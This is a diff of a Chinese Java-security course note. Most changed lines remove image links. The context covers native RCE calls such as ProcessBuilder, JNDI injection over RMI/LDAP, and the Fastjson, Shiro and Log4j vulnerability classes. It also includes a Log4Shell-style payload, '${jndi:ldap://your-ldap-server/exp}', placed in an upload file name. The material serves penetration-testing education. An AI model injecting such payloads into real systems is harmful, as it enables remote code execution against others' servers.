@@ -26,7 +26,6 @@
 
 ![](img/2bad90e2b256ef869fe1e32e14f7beeb_23.png)
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_25.png)
 
 ![](img/2bad90e2b256ef869fe1e32e14f7beeb_27.png)
 
@@ -34,23 +33,19 @@
 
 ![](img/2bad90e2b256ef869fe1e32e14f7beeb_31.png)
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_33.png)
 
 ![](img/2bad90e2b256ef869fe1e32e14f7beeb_35.png)
 
 ![](img/2bad90e2b256ef869fe1e32e14f7beeb_37.png)
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_39.png)
 
 ## Java原生RCE执行函数与类 🔧
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_41.png)
 
 ![](img/2bad90e2b256ef869fe1e32e14f7beeb_43.png)
 
 ![](img/2bad90e2b256ef869fe1e32e14f7beeb_45.png)
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_47.png)
 
 ![](img/2bad90e2b256ef869fe1e32e14f7beeb_49.png)
 
@@ -58,7 +53,6 @@
 
 上一节我们概述了课程内容，本节中我们来看看Java中实现原生RCE的几个关键函数和类。在PHP中有许多函数可以实现RCE，在Java中同样存在几个能够调用系统命令执行的类和函数。这些漏洞在黑盒测试中的发现思路与PHP类似，主要通过观察URL参数名、文件名和参数值，尝试修改并提交特定的Payload来测试是否存在代码或命令执行点。
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_53.png)
 
 ![](img/2bad90e2b256ef869fe1e32e14f7beeb_55.png)
 
@@ -100,9 +94,7 @@
     new ProcessBuilder("calc").start();
     ```
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_79.png)
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_81.png)
 
 ![](img/2bad90e2b256ef869fe1e32e14f7beeb_83.png)
 
@@ -138,19 +130,14 @@
 
 ![](img/2bad90e2b256ef869fe1e32e14f7beeb_103.png)
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_105.png)
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_107.png)
 
 ![](img/2bad90e2b256ef869fe1e32e14f7beeb_109.png)
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_111.png)
 
 熟悉这些类和函数，有助于在后期进行漏洞审计时，通过全局搜索这些关键词来定位潜在的RCE风险点。黑盒测试主要依靠功能点和参数特征进行猜测，而白盒测试则可以直接在代码中搜索这些危险函数和可控的输入点。
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_113.png)
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_115.png)
 
 ## JNDI注入原理与应用 🌐
 
@@ -182,7 +169,6 @@
 
 ![](img/2bad90e2b256ef869fe1e32e14f7beeb_141.png)
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_143.png)
 
 ![](img/2bad90e2b256ef869fe1e32e14f7beeb_145.png)
 
@@ -219,7 +205,6 @@ JNDI注入的核心原理是：当应用使用JNDI接口动态查找并加载远
 *   **RMI (Remote Method Invocation)**：Java远程方法调用注册表。
 *   **LDAP (Lightweight Directory Access Protocol)**：轻量级目录访问协议。
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_172.png)
 
 利用工具（如JNDI-Injection-Exploit）可以快速生成恶意RMI/LDAP服务。使用时，需要根据目标环境的JDK版本选择合适的Payload，因为高版本JDK对JNDI注入有防御限制。
 
@@ -255,9 +240,7 @@ JNDI注入的核心原理是：当应用使用JNDI接口动态查找并加载远
 
 ![](img/2bad90e2b256ef869fe1e32e14f7beeb_196.png)
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_198.png)
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_200.png)
 
 ![](img/2bad90e2b256ef869fe1e32e14f7beeb_202.png)
 
@@ -277,23 +260,16 @@ JNDI注入的核心原理是：当应用使用JNDI接口动态查找并加载远
 
 ![](img/2bad90e2b256ef869fe1e32e14f7beeb_216.png)
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_218.png)
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_220.png)
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_222.png)
 
 上一节我们探讨了JNDI注入作为利用通道的作用，本节中我们来看看Java安全体系中著名的五大不安全组件。这些组件因其广泛使用和历史漏洞的高危性，在实战中经常成为攻击目标。它们分别是：Fastjson、Jackson、Shiro、XStream和Log4j。
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_224.png)
 
 ![](img/2bad90e2b256ef869fe1e32e14f7beeb_226.png)
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_228.png)
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_230.png)
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_232.png)
 
 以下是这五大组件的简要介绍和漏洞特征：
 
@@ -304,7 +280,6 @@ JNDI注入的核心原理是：当应用使用JNDI接口动态查找并加载远
     *   **漏洞本质**：在反序列化特定构造的JSON字符串时，可导致任意代码执行。
     *   **黑盒特征**：请求/响应体为JSON格式，可能包含`@type`等关键字。属于弱特征，需结合功能点猜测。
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_236.png)
 
 ![](img/2bad90e2b256ef869fe1e32e14f7beeb_238.png)
 
@@ -331,7 +306,6 @@ JNDI注入的核心原理是：当应用使用JNDI接口动态查找并加载远
 
 ![](img/2bad90e2b256ef869fe1e32e14f7beeb_246.png)
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_248.png)
 
 5.  **Log4j / Log4j2**
     *   **作用**：Apache的日志记录框架。
@@ -344,9 +318,7 @@ JNDI注入的核心原理是：当应用使用JNDI接口动态查找并加载远
 
 ![](img/2bad90e2b256ef869fe1e32e14f7beeb_254.png)
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_256.png)
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_258.png)
 
 ![](img/2bad90e2b256ef869fe1e32e14f7beeb_260.png)
 
@@ -356,11 +328,8 @@ JNDI注入的核心原理是：当应用使用JNDI接口动态查找并加载远
 
 ![](img/2bad90e2b256ef869fe1e32e14f7beeb_264.png)
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_265.png)
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_267.png)
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_269.png)
 
 ![](img/2bad90e2b256ef869fe1e32e14f7beeb_271.png)
 
@@ -370,7 +339,6 @@ JNDI注入的核心原理是：当应用使用JNDI接口动态查找并加载远
 3.  **将执行结果回显到HTTP响应中**：构造特殊的Payload，让命令执行的结果直接附加在当次HTTP请求的响应包中返回。
 4.  **利用目标内网已有服务**：如内网中的LDAP服务进行中转。
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_273.png)
 
 ![](img/2bad90e2b256ef869fe1e32e14f7beeb_275.png)
 
@@ -439,7 +407,6 @@ JNDI注入的核心原理是：当应用使用JNDI接口动态查找并加载远
     *   **版本确认**：查看`pom.xml`，确认Log4j版本为1.x，存在漏洞风险（实际Log4Shell主要影响Log4j2，但Log4j1.x也有其他问题，此处仅作演示思路）。
     *   **漏洞验证**：在后台“上传管理员头像”功能处，将上传的文件名改为JNDI Payload（如`${jndi:ldap://your-ldap-server/exp}`）。提交后，观察JNDI工具是否收到请求。**注意**：此漏洞能否成功利用，高度依赖于服务器运行的JDK版本（需低于限制版本）。
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_321.png)
 
 ![](img/2bad90e2b256ef869fe1e32e14f7beeb_323.png)
 
@@ -469,7 +436,6 @@ JNDI注入的核心原理是：当应用使用JNDI接口动态查找并加载远
 
 ![](img/2bad90e2b256ef869fe1e32e14f7beeb_341.png)
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_343.png)
 
 ![](img/2bad90e2b256ef869fe1e32e14f7beeb_345.png)
 
@@ -477,15 +443,12 @@ JNDI注入的核心原理是：当应用使用JNDI接口动态查找并加载远
 
 ## 总结与下节预告 📚
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_349.png)
 
 本节课中我们一起学习了Java安全的三个重要部分。
 
 ![](img/2bad90e2b256ef869fe1e32e14f7beeb_351.png)
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_353.png)
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_355.png)
 
 ![](img/2bad90e2b256ef869fe1e32e14f7beeb_357.png)
 
@@ -497,7 +460,6 @@ JNDI注入的核心原理是：当应用使用JNDI接口动态查找并加载远
 
 ![](img/2bad90e2b256ef869fe1e32e14f7beeb_363.png)
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_365.png)
 
 ![](img/2bad90e2b256ef869fe1e32e14f7beeb_367.png)
 
@@ -511,7 +473,6 @@ JNDI注入的核心原理是：当应用使用JNDI接口动态查找并加载远
 
 ![](img/2bad90e2b256ef869fe1e32e14f7beeb_375.png)
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_377.png)
 
 ![](img/2bad90e2b256ef869fe1e32e14f7beeb_378.png)
 
@@ -527,7 +488,6 @@ JNDI注入的核心原理是：当应用使用JNDI接口动态查找并加载远
 
 ![](img/2bad90e2b256ef869fe1e32e14f7beeb_388.png)
 
-![](img/2bad90e2b256ef869fe1e32e14f7beeb_390.png)
 
 ![](img/2bad90e2b256ef869fe1e32e14f7beeb_392.png)
 
